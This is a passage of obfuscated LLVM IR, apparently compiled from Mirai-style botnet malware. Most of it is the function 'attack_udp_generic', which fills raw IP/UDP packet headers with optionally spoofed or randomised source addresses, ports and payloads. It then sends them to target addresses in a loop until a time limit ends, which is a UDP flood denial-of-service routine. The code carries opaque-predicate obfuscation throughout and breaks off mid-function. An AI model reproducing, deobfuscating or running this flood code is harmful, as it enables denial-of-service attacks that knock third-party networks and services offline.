  %885 = call i64 @time(i64* null) #6
  %886 = load i32, i32* %37, align 4
  %887 = sext i32 %886 to i64
  %888 = icmp sgt i64 %885, %887
  br label %originalBB255

originalBB259alteredBB:                           ; preds = %originalBB259, %594
  br label %originalBB259
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = load i32, i32* @x.25
  %7 = load i32, i32* @y.26
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_target*, align 8
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_option*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8**, align 8
  %22 = alloca i8, align 1
  %23 = alloca i16, align 2
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i16, align 2
  %27 = alloca i16, align 2
  %28 = alloca i16, align 2
  %29 = alloca i8, align 1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %struct.iphdr*, align 8
  %36 = alloca %struct.udphdr*, align 8
  %37 = alloca i8*, align 8
  %38 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %14, align 4
  store i8 %1, i8* %15, align 1
  store %struct.attack_target* %2, %struct.attack_target** %16, align 8
  store i8 %3, i8* %17, align 1
  store %struct.attack_option* %4, %struct.attack_option** %18, align 8
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %39 = load i8, i8* %15, align 1
  %40 = zext i8 %39 to i64
  %41 = call noalias i8* @calloc(i64 %40, i64 8) #6
  %42 = bitcast i8* %41 to i8**
  store i8** %42, i8*** %21, align 8
  %43 = load i8, i8* %17, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 2, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %22, align 1
  %47 = load i8, i8* %17, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 3, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %23, align 2
  %51 = load i8, i8* %17, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 4, i32 64)
  %54 = trunc i32 %53 to i8
  store i8 %54, i8* %24, align 1
  %55 = load i8, i8* %17, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 5, i32 0)
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %25, align 1
  %59 = load i8, i8* %17, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 6, i32 65535)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %26, align 2
  %63 = load i8, i8* %17, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 7, i32 65535)
  %66 = trunc i32 %65 to i16
  store i16 %66, i16* %27, align 2
  %67 = load i8, i8* %17, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 0, i32 512)
  %70 = trunc i32 %69 to i16
  store i16 %70, i16* %28, align 2
  %71 = load i8, i8* %17, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 1, i32 1)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %29, align 1
  %75 = load i8, i8* %17, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %77 = load i32, i32* @LOCAL_ADDR, align 4
  %78 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 19, i32 %77)
  store i32 %78, i32* %30, align 4
  %79 = call i64 @time(i64* null) #6
  %80 = load i32, i32* %14, align 4
  %81 = sext i32 %80 to i64
  %82 = add nsw i64 %79, %81
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %31, align 4
  %84 = load i16, i16* %28, align 2
  %85 = zext i16 %84 to i32
  %86 = icmp sgt i32 %85, 1460
  %87 = load i32, i32* @x.25
  %88 = load i32, i32* @y.26
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %86, label %95, label %96

; <label>:95:                                     ; preds = %originalBBpart2
  store i16 1460, i16* %28, align 2
  br label %96

; <label>:96:                                     ; preds = %95, %originalBBpart2
  %97 = load i32, i32* @x.25
  %98 = load i32, i32* @y.26
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBB4, label %originalBB4alteredBB

originalBB4:                                      ; preds = %originalBB4alteredBB, %96
  %105 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %105, i32* %20, align 4
  %106 = icmp eq i32 %105, -1
  %107 = load i32, i32* @x.25
  %108 = load i32, i32* @y.26
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart26, label %originalBB4alteredBB

originalBBpart26:                                 ; preds = %originalBB4
  br i1 %106, label %115, label %116

; <label>:115:                                    ; preds = %originalBBpart26
  br label %506

; <label>:116:                                    ; preds = %originalBBpart26
  store i32 1, i32* %19, align 4
  %117 = load i32, i32* %20, align 4
  %118 = bitcast i32* %19 to i8*
  %119 = call i32 @setsockopt(i32 %117, i32 0, i32 3, i8* %118, i32 4) #6
  %120 = icmp eq i32 %119, -1
  br i1 %120, label %121, label %140

; <label>:121:                                    ; preds = %116
  %122 = load i32, i32* @x.25
  %123 = load i32, i32* @y.26
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %121
  %130 = load i32, i32* %20, align 4
  %131 = call i32 @close(i32 %130)
  %132 = load i32, i32* @x.25
  %133 = load i32, i32* @y.26
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart210, label %originalBB8alteredBB

originalBBpart210:                                ; preds = %originalBB8
  br label %506

; <label>:140:                                    ; preds = %116
  store i32 0, i32* %19, align 4
  br label %141

; <label>:141:                                    ; preds = %originalBBpart220, %140
  %142 = load i32, i32* @x.25
  %143 = load i32, i32* @y.26
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %141
  %150 = load i32, i32* %19, align 4
  %151 = load i8, i8* %15, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp slt i32 %150, %152
  %154 = load i32, i32* @x.25
  %155 = load i32, i32* @y.26
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br i1 %153, label %162, label %258

; <label>:162:                                    ; preds = %originalBBpart214
  %163 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %164 = load i8**, i8*** %21, align 8
  %165 = load i32, i32* %19, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds i8*, i8** %164, i64 %166
  store i8* %163, i8** %167, align 8
  %168 = load i8**, i8*** %21, align 8
  %169 = load i32, i32* %19, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i8*, i8** %168, i64 %170
  %172 = load i8*, i8** %171, align 8
  %173 = bitcast i8* %172 to %struct.iphdr*
  store %struct.iphdr* %173, %struct.iphdr** %32, align 8
  %174 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i64 1
  %176 = bitcast %struct.iphdr* %175 to %struct.udphdr*
  store %struct.udphdr* %176, %struct.udphdr** %33, align 8
  %177 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %178 = bitcast %struct.iphdr* %177 to i8*
  %179 = load i8, i8* %178, align 4
  %180 = and i8 %179, 15
  %181 = or i8 %180, 64
  store i8 %181, i8* %178, align 4
  %182 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %183 = bitcast %struct.iphdr* %182 to i8*
  %184 = load i8, i8* %183, align 4
  %185 = and i8 %184, -16
  %186 = or i8 %185, 5
  store i8 %186, i8* %183, align 4
  %187 = load i8, i8* %22, align 1
  %188 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 1
  store i8 %187, i8* %189, align 1
  %190 = load i16, i16* %28, align 2
  %191 = zext i16 %190 to i64
  %192 = add i64 28, %191
  %193 = trunc i64 %192 to i16
  %194 = call zeroext i16 @htons(i16 zeroext %193) #7
  %195 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %196 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %195, i32 0, i32 2
  store i16 %194, i16* %196, align 2
  %197 = load i16, i16* %23, align 2
  %198 = call zeroext i16 @htons(i16 zeroext %197) #7
  %199 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 3
  store i16 %198, i16* %200, align 4
  %201 = load i8, i8* %24, align 1
  %202 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 5
  store i8 %201, i8* %203, align 4
  %204 = load i8, i8* %25, align 1
  %205 = icmp ne i8 %204, 0
  br i1 %205, label %206, label %210

; <label>:206:                                    ; preds = %162
  %207 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %208 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 4
  store i16 %207, i16* %209, align 2
  br label %210

; <label>:210:                                    ; preds = %206, %162
  %211 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 6
  store i8 17, i8* %212, align 1
  %213 = load i32, i32* %30, align 4
  %214 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 8
  store i32 %213, i32* %215, align 4
  %216 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %217 = load i32, i32* %19, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %216, i64 %218
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %219, i32 0, i32 1
  %221 = load i32, i32* %220, align 4
  %222 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i32 0, i32 9
  store i32 %221, i32* %223, align 4
  %224 = load i16, i16* %26, align 2
  %225 = call zeroext i16 @htons(i16 zeroext %224) #7
  %226 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %227 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %226, i32 0, i32 0
  store i16 %225, i16* %227, align 2
  %228 = load i16, i16* %27, align 2
  %229 = call zeroext i16 @htons(i16 zeroext %228) #7
  %230 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %231 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %230, i32 0, i32 1
  store i16 %229, i16* %231, align 2
  %232 = load i16, i16* %28, align 2
  %233 = zext i16 %232 to i64
  %234 = add i64 8, %233
  %235 = trunc i64 %234 to i16
  %236 = call zeroext i16 @htons(i16 zeroext %235) #7
  %237 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %238 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %237, i32 0, i32 2
  store i16 %236, i16* %238, align 2
  br label %239

; <label>:239:                                    ; preds = %210
  %240 = load i32, i32* @x.25
  %241 = load i32, i32* @y.26
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %239
  %248 = load i32, i32* %19, align 4
  %249 = add nsw i32 %248, 1
  store i32 %249, i32* %19, align 4
  %250 = load i32, i32* @x.25
  %251 = load i32, i32* @y.26
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBBpart220, label %originalBB16alteredBB

originalBBpart220:                                ; preds = %originalBB16
  br label %141

; <label>:258:                                    ; preds = %originalBBpart214
  %259 = load i32, i32* @x.25
  %260 = load i32, i32* @y.26
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %258
  %267 = load i32, i32* @x.25
  %268 = load i32, i32* @y.26
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %275

; <label>:275:                                    ; preds = %505, %originalBBpart224
  store i32 0, i32* %19, align 4
  br label %276

; <label>:276:                                    ; preds = %496, %275
  %277 = load i32, i32* %19, align 4
  %278 = load i8, i8* %15, align 1
  %279 = zext i8 %278 to i32
  %280 = icmp slt i32 %277, %279
  br i1 %280, label %281, label %499

; <label>:281:                                    ; preds = %276
  %282 = load i8**, i8*** %21, align 8
  %283 = load i32, i32* %19, align 4
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds i8*, i8** %282, i64 %284
  %286 = load i8*, i8** %285, align 8
  store i8* %286, i8** %34, align 8
  %287 = load i8*, i8** %34, align 8
  %288 = bitcast i8* %287 to %struct.iphdr*
  store %struct.iphdr* %288, %struct.iphdr** %35, align 8
  %289 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i64 1
  %291 = bitcast %struct.iphdr* %290 to %struct.udphdr*
  store %struct.udphdr* %291, %struct.udphdr** %36, align 8
  %292 = load %struct.udphdr*, %struct.udphdr** %36, align 8
  %293 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %292, i64 1
  %294 = bitcast %struct.udphdr* %293 to i8*
  store i8* %294, i8** %37, align 8
  %295 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %296 = load i32, i32* %19, align 4
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %295, i64 %297
  %299 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %298, i32 0, i32 2
  %300 = load i8, i8* %299, align 4
  %301 = zext i8 %300 to i32
  %302 = icmp slt i32 %301, 32
  br i1 %302, label %303, label %340

; <label>:303:                                    ; preds = %281
  %304 = load i32, i32* @x.25
  %305 = load i32, i32* @y.26
  %306 = sub i32 %304, 1
  %307 = mul i32 %304, %306
  %308 = urem i32 %307, 2
  %309 = icmp eq i32 %308, 0
  %310 = icmp slt i32 %305, 10
  %311 = or i1 %309, %310
  br i1 %311, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %303
  %312 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %313 = load i32, i32* %19, align 4
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %312, i64 %314
  %316 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %315, i32 0, i32 1
  %317 = load i32, i32* %316, align 4
  %318 = call i32 @ntohl(i32 %317) #7
  %319 = call i32 @rand_next()
  %320 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %321 = load i32, i32* %19, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %323, i32 0, i32 2
  %325 = load i8, i8* %324, align 4
  %326 = zext i8 %325 to i32
  %327 = lshr i32 %319, %326
  %328 = add i32 %318, %327
  %329 = call i32 @htonl(i32 %328) #7
  %330 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 9
  store i32 %329, i32* %331, align 4
  %332 = load i32, i32* @x.25
  %333 = load i32, i32* @y.26
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBBpart240, label %originalBB26alteredBB

originalBBpart240:                                ; preds = %originalBB26
  br label %340

; <label>:340:                                    ; preds = %originalBBpart240, %281
  %341 = load i32, i32* %30, align 4
  %342 = icmp eq i32 %341, -1
  br i1 %342, label %343, label %363

; <label>:343:                                    ; preds = %340
  %344 = load i32, i32* @x.25
  %345 = load i32, i32* @y.26
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %343
  %352 = call i32 @rand_next()
  %353 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %354 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %353, i32 0, i32 8
  store i32 %352, i32* %354, align 4
  %355 = load i32, i32* @x.25
  %356 = load i32, i32* @y.26
  %357 = sub i32 %355, 1
  %358 = mul i32 %355, %357
  %359 = urem i32 %358, 2
  %360 = icmp eq i32 %359, 0
  %361 = icmp slt i32 %356, 10
  %362 = or i1 %360, %361
  br i1 %362, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %363

; <label>:363:                                    ; preds = %originalBBpart244, %340
  %364 = load i32, i32* @x.25
  %365 = load i32, i32* @y.26
  %366 = sub i32 %364, 1
  %367 = mul i32 %364, %366
  %368 = urem i32 %367, 2
  %369 = icmp eq i32 %368, 0
  %370 = icmp slt i32 %365, 10
  %371 = or i1 %369, %370
  br i1 %371, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %363
  %372 = load i16, i16* %23, align 2
  %373 = zext i16 %372 to i32
  %374 = icmp eq i32 %373, 65535
  %375 = load i32, i32* @x.25
  %376 = load i32, i32* @y.26
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %374, label %383, label %388

; <label>:383:                                    ; preds = %originalBBpart248
  %384 = call i32 @rand_next()
  %385 = trunc i32 %384 to i16
  %386 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %387 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %386, i32 0, i32 3
  store i16 %385, i16* %387, align 4
  br label %388

; <label>:388:                                    ; preds = %383, %originalBBpart248
  %389 = load i32, i32* @x.25
  %390 = load i32, i32* @y.26
  %391 = sub i32 %389, 1
  %392 = mul i32 %389, %391
  %393 = urem i32 %392, 2
  %394 = icmp eq i32 %393, 0
  %395 = icmp slt i32 %390, 10
  %396 = or i1 %394, %395
  br i1 %396, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %388
  %397 = load i16, i16* %26, align 2
  %398 = zext i16 %397 to i32
  %399 = icmp eq i32 %398, 65535
  %400 = load i32, i32* @x.25
  %401 = load i32, i32* @y.26
  %402 = sub i32 %400, 1
  %403 = mul i32 %400, %402
  %404 = urem i32 %403, 2
  %405 = icmp eq i32 %404, 0
  %406 = icmp slt i32 %401, 10
  %407 = or i1 %405, %406
  br i1 %407, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %399, label %408, label %413

; <label>:408:                                    ; preds = %originalBBpart252
  %409 = call i32 @rand_next()
  %410 = trunc i32 %409 to i16
  %411 = load %struct.udphdr*, %struct.udphdr** %36, align 8
  %412 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %411, i32 0, i32 0
  store i16 %410, i16* %412, align 2
  br label %413

; <label>:413:                                    ; preds = %408, %originalBBpart252
  %414 = load i16, i16* %27, align 2
  %415 = zext i16 %414 to i32
  %416 = icmp eq i32 %415, 65535
  br i1 %416, label %417, label %438

; <label>:417:                                    ; preds = %413
  %418 = load i32, i32* @x.25
  %419 = load i32, i32* @y.26
  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %417
  %426 = call i32 @rand_next()
  %427 = trunc i32 %426 to i16
  %428 = load %struct.udphdr*, %struct.udphdr** %36, align 8
  %429 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %428, i32 0, i32 1
  store i16 %427, i16* %429, align 2
  %430 = load i32, i32* @x.25
  %431 = load i32, i32* @y.26
  %432 = sub i32 %430, 1
  %433 = mul i32 %430, %432
  %434 = urem i32 %433, 2
  %435 = icmp eq i32 %434, 0
  %436 = icmp slt i32 %431, 10
  %437 = or i1 %435, %436
  br i1 %437, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %438

; <label>:438:                                    ; preds = %originalBBpart256, %413
  %439 = load i8, i8* %29, align 1
  %440 = icmp ne i8 %439, 0
  br i1 %440, label %441, label %449

; <label>:441:                                    ; preds = %438
  %442 = load i8*, i8** %37, align 8
  %443 = load i16, i16* %28, align 2
  %444 = zext i16 %443 to i32
  call void @rand_alpha_str(i8* %442, i32 %444)
  %445 = load i8*, i8** %37, align 8
  %446 = load i16, i16* %28, align 2
  %447 = zext i16 %446 to i64
  %448 = getelementptr inbounds i8, i8* %445, i64 %447
  store i8 0, i8* %448, align 1
  br label %449

; <label>:449:                                    ; preds = %441, %438
  %450 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %451 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %450, i32 0, i32 7
  store i16 0, i16* %451, align 2
  %452 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %453 = bitcast %struct.iphdr* %452 to i16*
  %454 = call zeroext i16 @checksum_generic(i16* %453, i32 20)
  %455 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %456 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %455, i32 0, i32 7
  store i16 %454, i16* %456, align 2
  %457 = load %struct.udphdr*, %struct.udphdr** %36, align 8
  %458 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %457, i32 0, i32 3
  store i16 0, i16* %458, align 2
  %459 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %460 = load %struct.udphdr*, %struct.udphdr** %36, align 8
  %461 = bitcast %struct.udphdr* %460 to i8*
  %462 = load %struct.udphdr*, %struct.udphdr** %36, align 8
  %463 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %462, i32 0, i32 2
  %464 = load i16, i16* %463, align 2
  %465 = load i16, i16* %28, align 2
  %466 = zext i16 %465 to i64
  %467 = add i64 8, %466
  %468 = trunc i64 %467 to i32
  %469 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %459, i8* %461, i16 zeroext %464, i32 %468)
  %470 = load %struct.udphdr*, %struct.udphdr** %36, align 8
  %471 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %470, i32 0, i32 3
  store i16 %469, i16* %471, align 2
  %472 = load %struct.udphdr*, %struct.udphdr** %36, align 8
  %473 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %472, i32 0, i32 1
  %474 = load i16, i16* %473, align 2
  %475 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %476 = load i32, i32* %19, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %475, i64 %477
  %479 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %478, i32 0, i32 0
  %480 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %479, i32 0, i32 1
  store i16 %474, i16* %480, align 2
  %481 = load i32, i32* %20, align 4
  %482 = load i8*, i8** %34, align 8
  %483 = load i16, i16* %28, align 2
  %484 = zext i16 %483 to i64
  %485 = add i64 28, %484
  %486 = bitcast %union.__CONST_SOCKADDR_ARG* %38 to %struct.sockaddr**
  %487 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %488 = load i32, i32* %19, align 4
  %489 = sext i32 %488 to i64
  %490 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %487, i64 %489
  %491 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %490, i32 0, i32 0
  %492 = bitcast %struct.sockaddr_in* %491 to %struct.sockaddr*
  store %struct.sockaddr* %492, %struct.sockaddr** %486, align 8
  %493 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %38, i32 0, i32 0
  %494 = load %struct.sockaddr*, %struct.sockaddr** %493, align 8
  %495 = call i64 @sendto(i32 %481, i8* %482, i64 %485, i32 16384, %struct.sockaddr* %494, i32 16)
  br label %496

; <label>:496:                                    ; preds = %449
  %497 = load i32, i32* %19, align 4
  %498 = add nsw i32 %497, 1
  store i32 %498, i32* %19, align 4
  br label %276

; <label>:499:                                    ; preds = %276
  %500 = call i64 @time(i64* null) #6
  %501 = load i32, i32* %31, align 4
  %502 = sext i32 %501 to i64
  %503 = icmp sgt i64 %500, %502
  br i1 %503, label %504, label %505

; <label>:504:                                    ; preds = %499
  br label %506

; <label>:505:                                    ; preds = %499
  br label %275

; <label>:506:                                    ; preds = %504, %originalBBpart210, %115
  %507 = load i32, i32* @x.25
  %508 = load i32, i32* @y.26
  %509 = sub i32 %507, 1
  %510 = mul i32 %507, %509
  %511 = urem i32 %510, 2
  %512 = icmp eq i32 %511, 0
  %513 = icmp slt i32 %508, 10
  %514 = or i1 %512, %513
  br i1 %514, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %506
  %515 = load i32, i32* @x.25
  %516 = load i32, i32* @y.26
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %523 = alloca i32, align 4
  %524 = alloca i8, align 1
  %525 = alloca %struct.attack_target*, align 8
  %526 = alloca i8, align 1
  %527 = alloca %struct.attack_option*, align 8
  %528 = alloca i32, align 4
  %529 = alloca i32, align 4
  %530 = alloca i8**, align 8
  %531 = alloca i8, align 1
  %532 = alloca i16, align 2
  %533 = alloca i8, align 1
  %534 = alloca i8, align 1
  %535 = alloca i16, align 2
  %536 = alloca i16, align 2
  %537 = alloca i16, align 2
